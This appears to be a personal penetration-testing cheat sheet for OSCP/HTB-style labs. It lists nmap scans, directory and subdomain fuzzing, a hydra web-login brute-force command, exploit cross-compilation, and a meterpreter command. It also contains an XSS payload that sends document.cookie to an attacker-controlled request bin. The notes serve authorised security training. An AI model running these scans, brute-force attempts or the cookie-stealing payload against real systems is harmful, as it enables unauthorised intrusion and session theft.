# Flow
----------

### Port Scans

```bash
nmap -sC -sV -v --open -oN nmap_default.out $IP
nmap -sC -sV -v --open -Pn -oN nmap_default.out $IP

nmap -p- -v --open -oN nmap_full.out $IP
nmap -p- -v -Pn --open -oN nmap_full.out $IP
```

```bash
rustscan -a $IP
```

UDP
```bash
sudo nmap -sUV -T4 -F --version-intensity 0 10.11.1.111

sudo nmap -sU -T4 -v -oN nmap_udp 10.11.1.111 --top-ports 20
```

Proxychains
```bash
proxychains nmap -sT -Pn -p 21,22,80,111 -sC -sV -v 10.1.1.27 --open

sudo proxychains nmap --top-ports=20 -sT -Pn -v 10.1.1.95 --open 
```

Script Scans
```bash
sudo nmap --script vuln -p 443,80 10.10.10.10

sudo nmap --script 'smb-vuln*' -p 445 -v 192.168.68.40

sudo nmap -n -Pn -sU -v -p69 -sV --script tftp-enum 10.11.1.111

nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p 5800 10.11.1.227 -v
```

----------------

### Directory Fuzzing 
- check out for .git directories 
- cgi-bin directories
- files
- try different wordlists

```bash
gobuster dir -u http://$IP/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,bak,txt
```

```bash
gobuster dir -u http://:$IP/ -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,bak,txt
```

```bash
python3 /opt/dirsearch/dirsearch.py -u http://10.10.10.191/
```

```bash
python3 /opt/dirsearch/dirsearch.py -u http://10.10.10.191/ -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
```

```bash
/opt/SecLists/Discovery/Web-Content/raft-large-directories.txt
```

```bash
/opt/SecLists/Discovery/Web-Content/common.txt
```

```bash
/opt/SecLists/Discovery/Web-Content/raft-large-files.txt
```

```bash
/opt/SecLists/Discovery/Web-Content/raft-large-words.txt
```

---------------


### Subdomain FUZZ
```bash
wfuzz -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --hc 404 -c -u http://backdoor.htb -H "Host:FUZZ.backdoor.htb" 
```

### Tid bits
- Remember **SEARCHSPLOIT** and **METASPLOIT** for version exploits!!!!!

- Run **NIKTO** (to get cgi-bin stuff)

- generate wordlists using cewl:
```bash
cewl http://target.htb/
```


- If there is ssh with OpenSSH < 7.7, use CVE-2018-15473 
 https://github.com/epi052/cve-2018-15473/blob/master/ssh-username-enum.py
 
- Brute forcing passwords on web pages using hydra:
```bash

hydra -l admin -P /opt/rockyou.txt X.X.X.X http-post-form "/URL/Login:User=^USER&password=^PASS:F=<String indicating attempt has failed>" -I
```

- get cookie: ```
```bash
<script>document.write("<img src='http://<IP> or <request bin>'"+document.cookie+"');</script>
```

- download files recursively over ftp:
```bash
wget -r ftp://user:pass@serv
```

- run a command in meterpreter:
```bash
execute -i -H -f "cmd"
```

- nginx -> almost no php

https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-main.md#Initial-Recon-1

https://therealunicornsecurity.github.io/OSCP/#tldr-



### Compiling exploits

32bit linux 
```bash
gcc -m32 -march=i686 code.c -o exp -static
```

Cross compile exploit for windows
```bash
# dpkg --add-architecture i386
# install mingw32/64
# 32 bits:
i686-w64-mingw32-g++-win32 exp.cpp -static -o exp
# 64 bits:
x86_64-w64-mingw32-g++ exp.cpp -static -o exp
```

C to shared library (so)
```bash
gcc -o exploit.so -shared exploit.c -fPIC 
```
